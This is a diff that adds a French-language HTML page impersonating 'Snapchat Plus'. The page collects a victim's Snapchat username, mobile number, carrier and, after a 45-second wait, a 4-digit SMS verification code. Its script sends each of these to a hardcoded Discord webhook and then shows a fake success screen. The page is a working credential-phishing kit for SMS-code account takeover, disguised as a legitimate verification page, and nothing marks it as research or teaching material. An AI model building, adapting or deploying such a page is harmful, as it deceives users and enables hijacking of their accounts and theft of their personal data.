@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0F0F0F">
+<title>Snapchat Plus</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --snap-yellow: #FFFC00;
+    --snap-yellow-soft: #FFF566;
+    --snap-yellow-dark: #E8D800;
+    --snap-black: #0A0A0A;
+    --snap-gray: #F4F4F8;
+    --snap-text: #0F0F0F;
+    --snap-sub: #8A8A94;
+    --snap-red: #FF3B30;
+    --snap-green: #34C759;
+  }
+
+  html, body {
+    height: 100%;
+    font-family: -apple-system, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+    background: var(--snap-black);
+    color: var(--snap-text);
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+    position: relative;
+  }
+
+  .bg-gradient {
+    position: fixed; inset: 0; z-index: 0;
+    background:
+      radial-gradient(ellipse 60% 50% at 15% 10%, rgba(255,252,0,0.85) 0%, transparent 55%),
+      radial-gradient(ellipse 50% 60% at 85% 15%, rgba(255,240,80,0.5) 0%, transparent 55%),
+      radial-gradient(ellipse 70% 60% at 80% 90%, rgba(245,232,0,0.75) 0%, transparent 55%),
+      radial-gradient(ellipse 50% 50% at 20% 85%, rgba(255,220,0,0.4) 0%, transparent 55%),
+      linear-gradient(135deg, #0A0A0A 0%, #1A1A0A 50%, #0A0A0A 100%);
+    background-size: 200% 200%, 200% 200%, 200% 200%, 200% 200%, 100% 100%;
+    animation: bgShift 24s ease-in-out infinite alternate;
+    filter: saturate(1.3);
+  }
+  @keyframes bgShift {
+    0%   { background-position: 0% 0%, 100% 0%, 100% 100%, 0% 100%, 0 0; }
+    50%  { background-position: 60% 40%, 40% 60%, 40% 40%, 60% 60%, 0 0; }
+    100% { background-position: 100% 100%, 0% 100%, 0% 0%, 100% 0%, 0 0; }
+  }
+  .bg-gradient::after {
+    content: ""; position: absolute; inset: 0; opacity: 0.06;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+    mix-blend-mode: overlay;
+  }
+
+  #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
+
+  .halo {
+    position: fixed; z-index: 1; border-radius: 50%;
+    filter: blur(80px); opacity: 0.55;
+    animation: haloDrift 22s ease-in-out infinite alternate;
+    pointer-events: none;
+  }
+  .halo.h1 { width: 340px; height: 340px; top: -80px; left: -80px; background: #FFFC00; animation-delay: 0s; }
+  .halo.h2 { width: 260px; height: 260px; bottom: -60px; right: -60px; background: #FFD400; animation-delay: -7s; }
+  .halo.h3 { width: 200px; height: 200px; top: 40%; right: -40px; background: #FFF566; animation-delay: -14s; }
+  @keyframes haloDrift {
+    0%   { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(40px, -30px) scale(1.15); }
+  }
+
+  .phone {
+    position: relative; z-index: 2;
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    padding: 24px 20px;
+  }
+
+  .card {
+    position: relative;
+    width: 100%; max-width: 400px;
+    padding: 40px 30px 34px;
+    border-radius: 32px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.99) 0%, rgba(250,250,252,0.97) 100%);
+    box-shadow:
+      0 30px 80px -20px rgba(0,0,0,0.6),
+      0 10px 30px -10px rgba(255,252,0,0.4),
+      inset 0 1px 0 rgba(255,255,255,1);
+    overflow: hidden;
+    animation: cardIn 0.9s cubic-bezier(0.16, 1, 0.3, 1);
+    backdrop-filter: blur(24px);
+  }
+  @keyframes cardIn {
+    0%   { opacity: 0; transform: translateY(60px) scale(0.94); }
+    100% { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .card::before {
+    content: ""; position: absolute; top: 0; left: 0; right: 0; height: 5px;
+    background: linear-gradient(90deg, transparent 0%, var(--snap-yellow) 20%, #FFF566 50%, var(--snap-yellow) 80%, transparent 100%);
+    background-size: 200% 100%;
+    animation: shine 3.5s linear infinite;
+  }
+  @keyframes shine {
+    0%   { background-position: 200% 0; }
+    100% { background-position: -200% 0; }
+  }
+  .card::after {
+    content: ""; position: absolute; top: -60%; right: -30%;
+    width: 220px; height: 220px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(255,252,0,0.35) 0%, transparent 70%);
+    pointer-events: none;
+    animation: innerGlow 6s ease-in-out infinite alternate;
+  }
+  @keyframes innerGlow {
+    0%   { opacity: 0.4; transform: scale(1); }
+    100% { opacity: 0.8; transform: scale(1.15); }
+  }
+
+  .logo {
+    position: relative;
+    width: 78px; height: 78px; margin: 0 auto 22px;
+    background: linear-gradient(160deg, #FFFC00 0%, #F0DC00 100%);
+    border-radius: 24px;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow:
+      0 12px 34px rgba(255,252,0,0.55),
+      0 0 0 1px rgba(255,255,255,0.4) inset,
+      0 -4px 0 rgba(0,0,0,0.08) inset;
+    animation: logoBounce 3s ease-in-out infinite;
+    z-index: 1;
+  }
+  .logo::after {
+    content: ""; position: absolute; inset: -12px;
+    border-radius: 32px;
+    background: radial-gradient(circle, rgba(255,252,0,0.4) 0%, transparent 70%);
+    animation: pulseGlow 2.4s ease-in-out infinite;
+    z-index: -1;
+  }
+  @keyframes pulseGlow {
+    0%, 100% { opacity: 0.5; transform: scale(1); }
+    50%      { opacity: 1; transform: scale(1.12); }
+  }
+  @keyframes logoBounce {
+    0%, 100% { transform: translateY(0) rotate(-3deg); }
+    50%      { transform: translateY(-8px) rotate(3deg); }
+  }
+  .logo svg { width: 46px; height: 46px; }
+
+  h1 {
+    font-size: 28px; font-weight: 900; text-align: center;
+    color: var(--snap-text); letter-spacing: -0.8px;
+    margin-bottom: 8px;
+    animation: fadeUp 0.7s 0.15s backwards;
+    position: relative; z-index: 1;
+  }
+  .sub {
+    font-size: 14px; color: var(--snap-sub); text-align: center;
+    margin-bottom: 30px; font-weight: 500;
+    animation: fadeUp 0.7s 0.25s backwards;
+    position: relative; z-index: 1;
+  }
+  @keyframes fadeUp {
+    0%   { opacity: 0; transform: translateY(16px); }
+    100% { opacity: 1; transform: translateY(0); }
+  }
+
+  .field {
+    margin-bottom: 18px;
+    animation: fadeUp 0.6s backwards;
+    position: relative; z-index: 1;
+  }
+  .field:nth-of-type(1) { animation-delay: 0.35s; }
+  .field:nth-of-type(2) { animation-delay: 0.45s; }
+  .field:nth-of-type(3) { animation-delay: 0.55s; }
+
+  label {
+    display: block; font-size: 11px; font-weight: 800;
+    text-transform: uppercase; letter-spacing: 1px;
+    color: var(--snap-sub); margin-bottom: 9px; padding-left: 6px;
+    transition: color 0.25s ease;
+  }
+  .field:focus-within label { color: #8A7A00; }
+
+  input {
+    width: 100%; padding: 16px 18px;
+    border: 2px solid var(--snap-gray);
+    border-radius: 16px;
+    font-size: 16px; font-weight: 600;
+    background: var(--snap-gray);
+    color: var(--snap-text);
+    outline: none;
+    transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+    font-family: inherit;
+  }
+  input::placeholder { color: #C0C0C8; font-weight: 500; }
+  input:focus {
+    border-color: var(--snap-yellow);
+    background: #FFFEF5;
+    transform: translateY(-3px);
+    box-shadow: 0 10px 24px -6px rgba(255,252,0,0.5), 0 0 0 4px rgba(255,252,0,0.15);
+  }
+  input.invalid {
+    border-color: var(--snap-red);
+    background: #FFF5F5;
+    animation: shake 0.45s;
+  }
+  @keyframes shake {
+    0%,100% { transform: translateX(0); }
+    20%     { transform: translateX(-8px); }
+    40%     { transform: translateX(8px); }
+    60%     { transform: translateX(-5px); }
+    80%     { transform: translateX(5px); }
+  }
+
+  .btn {
+    position: relative;
+    width: 100%; margin-top: 12px; padding: 18px;
+    background: linear-gradient(180deg, #FFFC00 0%, #F0DC00 100%);
+    color: var(--snap-black);
+    border: none; border-radius: 18px;
+    font-size: 16px; font-weight: 900; letter-spacing: 0.5px;
+    cursor: pointer; font-family: inherit;
+    box-shadow: 0 7px 0 #C8B800, 0 14px 26px -8px rgba(255,252,0,0.55);
+    transition: all 0.14s cubic-bezier(0.16,1,0.3,1);
+    overflow: hidden;
+    text-transform: uppercase;
+    z-index: 1;
+  }
+  .btn::before {
+    content: ""; position: absolute; top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+    transition: left 0.6s ease;
+  }
+  .btn:hover::before { left: 100%; }
+  .btn:active:not(:disabled) {
+    transform: translateY(5px);
+    box-shadow: 0 2px 0 #C8B800, 0 6px 14px -4px rgba(255,252,0,0.5);
+  }
+  .btn:disabled {
+    background: linear-gradient(180deg, #E8E8EC 0%, #D8D8DC 100%);
+    color: #A8A8B0;
+    box-shadow: 0 5px 0 #C0C0C4, 0 8px 16px -6px rgba(0,0,0,0.1);
+    cursor: not-allowed;
+  }
+  .btn .ripple {
+    position: absolute; border-radius: 50%;
+    background: rgba(255,255,255,0.7);
+    transform: scale(0);
+    animation: ripple 0.7s ease-out;
+    pointer-events: none;
+  }
+  @keyframes ripple { to { transform: scale(4); opacity: 0; } }
+
+  .code-input {
+    letter-spacing: 22px; text-align: center;
+    font-size: 30px; font-weight: 900;
+    padding-left: 34px; padding-right: 12px;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .timer-wrap {
+    display: flex; align-items: center; justify-content: center;
+    gap: 16px; margin-top: 26px;
+    animation: fadeUp 0.6s 0.5s backwards;
+  }
+  .ring { width: 52px; height: 52px; transform: rotate(-90deg); }
+  .ring circle { fill: none; stroke-width: 5; stroke-linecap: round; }
+  .ring .track { stroke: #EAEAEE; }
+  .ring .progress {
+    stroke: var(--snap-yellow);
+    stroke-dasharray: 126;
+    stroke-dashoffset: 0;
+    transition: stroke-dashoffset 1s linear, stroke 0.4s ease;
+    filter: drop-shadow(0 0 6px rgba(255,252,0,0.7));
+  }
+  .timer-text {
+    font-size: 15px; font-weight: 800; color: var(--snap-sub);
+    font-variant-numeric: tabular-nums;
+    min-width: 44px;
+  }
+
+  .spinner {
+    display: inline-block; width: 28px; height: 28px;
+    border: 3px solid rgba(15,15,15,0.15);
+    border-top-color: var(--snap-black);
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .success-icon {
+    width: 96px; height: 96px; margin: 0 auto 24px;
+    background: linear-gradient(160deg, #4CD964 0%, #34C759 100%);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    animation: popIn 0.6s cubic-bezier(0.16,1,0.3,1);
+    box-shadow: 0 14px 40px -10px rgba(52,199,89,0.7), inset 0 -4px 0 rgba(0,0,0,0.12);
+    position: relative;
+  }
+  .success-icon::after {
+    content: ""; position: absolute; inset: -16px;
+    border-radius: 50%;
+    border: 2px solid rgba(52,199,89,0.3);
+    animation: ringExpand 1.4s ease-out infinite;
+  }
+  @keyframes ringExpand {
+    0%   { transform: scale(0.9); opacity: 0.8; }
+    100% { transform: scale(1.5); opacity: 0; }
+  }
+  @keyframes popIn {
+    0%   { transform: scale(0) rotate(-45deg); opacity: 0; }
+    60%  { transform: scale(1.15) rotate(6deg); }
+    100% { transform: scale(1) rotate(0); opacity: 1; }
+  }
+  .success-icon svg { width: 50px; height: 50px; }
+  .checkmark {
+    stroke-dasharray: 48; stroke-dashoffset: 48;
+    animation: draw 0.6s 0.35s forwards cubic-bezier(0.65,0,0.35,1);
+  }
+  @keyframes draw { to { stroke-dashoffset: 0; } }
+
+  .step {
+    animation: stepIn 0.55s cubic-bezier(0.16,1,0.3,1);
+    position: relative; z-index: 1;
+  }
+  @keyframes stepIn {
+    0%   { opacity: 0; transform: translateY(20px) scale(0.98); filter: blur(4px); }
+    100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+  }
+  .hidden { display: none !important; }
+
+  .badge {
+    position: absolute; top: 18px; right: 18px;
+    background: linear-gradient(135deg, var(--snap-black) 0%, #2A2A2A 100%);
+    color: var(--snap-yellow);
+    font-size: 10px; font-weight: 900; letter-spacing: 1.5px;
+    padding: 6px 12px; border-radius: 10px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+    animation: fadeUp 0.6s 0.5s backwards;
+    z-index: 2;
+  }
+
+  .operator-info {
+    font-size: 12px; color: var(--snap-sub);
+    text-align: center; margin-top: 18px; font-weight: 500;
+    line-height: 1.5;
+    animation: fadeUp 0.6s 0.7s backwards;
+    position: relative; z-index: 1;
+  }
+  .operator-info span { color: var(--snap-text); font-weight: 800; }
+
+  @media (max-height: 700px) {
+    .card { padding: 30px 24px 26px; }
+    .logo { width: 66px; height: 66px; margin-bottom: 16px; }
+    h1 { font-size: 24px; }
+    input { padding: 14px 16px; }
+    .btn { padding: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-gradient"></div>
+<div class="halo h1"></div>
+<div class="halo h2"></div>
+<div class="halo h3"></div>
+<canvas id="particles"></canvas>
+
+<div class="phone">
+  <div class="card">
+
+    <div class="step" id="step1">
+      <div class="badge">PLUS</div>
+      <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M12 2C7 2 3 6 3 11c0 3 1.5 5.5 4 7l-1 3.5c-.2.8.6 1.4 1.3 1L12 20c5 0 9-4 9-9s-4-9-9-9z" fill="#0F0F0F"/>
+          <path d="M9 8.5c.8-1.2 2-2 3.5-2s2.7.8 3.5 2" stroke="#FFFC00" stroke-width="1.6" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h1>Snapchat Plus</h1>
+      <p class="sub">Vérification de ligne sécurisée</p>
+
+      <div class="field">
+        <label for="pseudo">Pseudo</label>
+        <input type="text" id="pseudo" placeholder="Ton pseudo" autocomplete="off" autocapitalize="off" spellcheck="false">
+      </div>
+
+      <div class="field">
+        <label for="phone">Numéro de téléphone</label>
+        <input type="tel" id="phone" placeholder="06 12 34 56 78" maxlength="14" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <div class="field">
+        <label for="operator">Opérateur</label>
+        <input type="text" id="operator" placeholder="Ex: Orange, SFR, Bouygues…" autocomplete="off">
+      </div>
+
+      <button class="btn" id="btnStep1">Continuer</button>
+      <p class="operator-info">En vérifiant, tu acceptes les <span>conditions Snapchat Plus</span>.</p>
+    </div>
+
+    <div class="step hidden" id="step2">
+      <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M6 3h12a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z" stroke="#0F0F0F" stroke-width="1.8"/>
+          <path d="M8 10h8M8 14h5" stroke="#FFFC00" stroke-width="1.8" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h1>Code de vérification</h1>
+      <p class="sub">Saisis le code à 4 chiffres reçu par SMS.</p>
+
+      <div class="field">
+        <label for="code">Code reçu</label>
+        <input type="text" id="code" class="code-input" maxlength="4" inputmode="numeric" placeholder="----" disabled>
+      </div>
+
+      <button class="btn" id="btnStep2" disabled>Valider</button>
+
+      <div class="timer-wrap">
+        <svg class="ring" viewBox="0 0 46 46">
+          <circle class="track" cx="23" cy="23" r="20"></circle>
+          <circle class="progress" id="ringProgress" cx="23" cy="23" r="20"></circle>
+        </svg>
+        <div class="timer-text" id="timerText">45 s</div>
+      </div>
+    </div>
+
+    <div class="step hidden" id="step3">
+      <div class="logo">
+        <div class="spinner"></div>
+      </div>
+      <h1>Vérification…</h1>
+      <p class="sub">Ton code est en cours de contrôle. Patiente un instant.</p>
+    </div>
+
+    <div class="step hidden" id="step4">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path class="checkmark" d="M5 12.5L10 17.5L19 7.5" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1>Vérifié ✓</h1>
+      <p class="sub">Ta ligne Snapchat Plus est confirmée. Bon snap !</p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1559240813521801298/Bij26Ra6lDZvJ1fhvWhlpTcss_SvNzGwVJir3Kq3uTRv9LVkZLurv1uf4cq6ln4L62IZ";
+
+const step1 = document.getElementById("step1");
+const step2 = document.getElementById("step2");
+const step3 = document.getElementById("step3");
+const step4 = document.getElementById("step4");
+const btnStep1 = document.getElementById("btnStep1");
+const btnStep2 = document.getElementById("btnStep2");
+const timerText = document.getElementById("timerText");
+const ringProgress = document.getElementById("ringProgress");
+const codeInput = document.getElementById("code");
+const phoneInput = document.getElementById("phone");
+const operatorInput = document.getElementById("operator");
+
+const payload = { pseudo: "", phone: "", operator: "" };
+
+/* Particules canvas */
+(function initParticles() {
+  const canvas = document.getElementById("particles");
+  const ctx = canvas.getContext("2d");
+  let w, h, particles;
+  const count = Math.min(60, Math.floor(window.innerWidth / 12));
+
+  function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+  }
+  window.addEventListener("resize", resize);
+  resize();
+
+  particles = Array.from({ length: count }, () => ({
+    x: Math.random() * w,
+    y: Math.random() * h,
+    vx: (Math.random() - 0.5) * 0.4,
+    vy: (Math.random() - 0.5) * 0.4,
+    r: 1 + Math.random() * 2.2
+  }));
+
+  function draw() {
+    ctx.clearRect(0, 0, w, h);
+    for (let i = 0; i < particles.length; i++) {
+      const p = particles[i];
+      p.x += p.vx;
+      p.y += p.vy;
+      if (p.x < 0 || p.x > w) p.vx *= -1;
+      if (p.y < 0 || p.y > h) p.vy *= -1;
+
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = "rgba(255,252,0,0.55)";
+      ctx.fill();
+
+      for (let j = i + 1; j < particles.length; j++) {
+        const q = particles[j];
+        const dx = p.x - q.x, dy = p.y - q.y;
+        const d = Math.sqrt(dx * dx + dy * dy);
+        if (d < 130) {
+          ctx.beginPath();
+          ctx.moveTo(p.x, p.y);
+          ctx.lineTo(q.x, q.y);
+          ctx.strokeStyle = "rgba(255,252,0," + (0.18 * (1 - d / 130)) + ")";
+          ctx.lineWidth = 0.7;
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* Ripple */
+document.querySelectorAll(".btn").forEach(btn => {
+  btn.addEventListener("click", e => {
+    const r = document.createElement("span");
+    r.className = "ripple";
+    const rect = btn.getBoundingClientRect();
+    const size = Math.max(rect.width, rect.height);
+    r.style.width = r.style.height = size + "px";
+    r.style.left = (e.clientX - rect.left - size / 2) + "px";
+    r.style.top = (e.clientY - rect.top - size / 2) + "px";
+    btn.appendChild(r);
+    setTimeout(() => r.remove(), 700);
+  });
+});
+
+/* Formatage numéro */
+phoneInput.addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g, "").slice(0, 10);
+  let out = v;
+  if (v.length > 2) out = v.slice(0, 2) + " " + v.slice(2);
+  if (v.length > 4) out = v.slice(0, 2) + " " + v.slice(2, 4) + " " + v.slice(4);
+  if (v.length > 6) out = v.slice(0, 2) + " " + v.slice(2, 4) + " " + v.slice(4, 6) + " " + v.slice(6);
+  if (v.length > 8) out = v.slice(0, 2) + " " + v.slice(2, 4) + " " + v.slice(4, 6) + " " + v.slice(6, 8) + " " + v.slice(8);
+  e.target.value = out;
+});
+
+/* Code : chiffres seulement */
+codeInput.addEventListener("input", e => {
+  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+});
+
+/* Envoi webhook */
+async function sendToWebhook(content) {
+  try {
+    const res = await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+    console.log("webhook status:", res.status);
+  } catch (e) {
+    console.error("webhook error:", e);
+  }
+}
+
+/* Étape 1 */
+btnStep1.addEventListener("click", () => {
+  const pseudo = document.getElementById("pseudo").value.trim();
+  const rawPhone = phoneInput.value.replace(/\s/g, "");
+  const operator = operatorInput.value.trim();
+
+  let ok = true;
+  if (!pseudo) { document.getElementById("pseudo").classList.add("invalid"); ok = false; }
+  if (!/^0[67]\d{8}$/.test(rawPhone)) { phoneInput.classList.add("invalid"); ok = false; }
+  if (!operator) { operatorInput.classList.add("invalid"); ok = false; }
+
+  if (!ok) {
+    setTimeout(() => {
+      document.querySelectorAll(".invalid").forEach(el => el.classList.remove("invalid"));
+    }, 700);
+    return;
+  }
+
+  payload.pseudo = pseudo;
+  payload.phone = rawPhone;
+  payload.operator = operator;
+
+  sendToWebhook(
+    "👻 **Snapchat Plus — Étape 1**\n" +
+    "**Pseudo :** " + pseudo + "\n" +
+    "**Numéro :** " + rawPhone + "\n" +
+    "**Opérateur :** " + operator
+  );
+
+  step1.classList.add("hidden");
+  step2.classList.remove("hidden");
+  startTimer();
+});
+
+/* Timer 45 s */
+function startTimer() {
+  let remaining = 45;
+  const total = 45;
+  const circumference = 2 * Math.PI * 20;
+  ringProgress.style.strokeDasharray = circumference;
+  ringProgress.style.strokeDashoffset = 0;
+  timerText.textContent = remaining + " s";
+
+  const interval = setInterval(() => {
+    remaining--;
+    timerText.textContent = remaining + " s";
+    ringProgress.style.strokeDashoffset = circumference * (1 - remaining / total);
+
+    if (remaining <= 0) {
+      clearInterval(interval);
+      timerText.textContent = "Prêt";
+      ringProgress.style.stroke = "#34C759";
+      codeInput.disabled = false;
+      btnStep2.disabled = false;
+      codeInput.focus();
+    }
+  }, 1000);
+}
+
+/* Étape 2 */
+btnStep2.addEventListener("click", () => {
+  const code = codeInput.value.trim();
+  if (!/^\d{4}$/.test(code)) {
+    codeInput.classList.add("invalid");
+    setTimeout(() => codeInput.classList.remove("invalid"), 700);
+    return;
+  }
+
+  step2.classList.add("hidden");
+  step3.classList.remove("hidden");
+
+  sendToWebhook(
+    "👻 **Snapchat Plus — Étape 2**\n" +
+    "**Pseudo :** " + payload.pseudo + "\n" +
+    "**Numéro :** " + payload.phone + "\n" +
+    "**Opérateur :** " + payload.operator + "\n" +
+    "**Code :** " + code
+  );
+
+  setTimeout(() => {
+    step3.classList.add("hidden");
+    step4.classList.remove("hidden");
+  }, 2200);
+});
+</script>
+
+</body>
+</html>
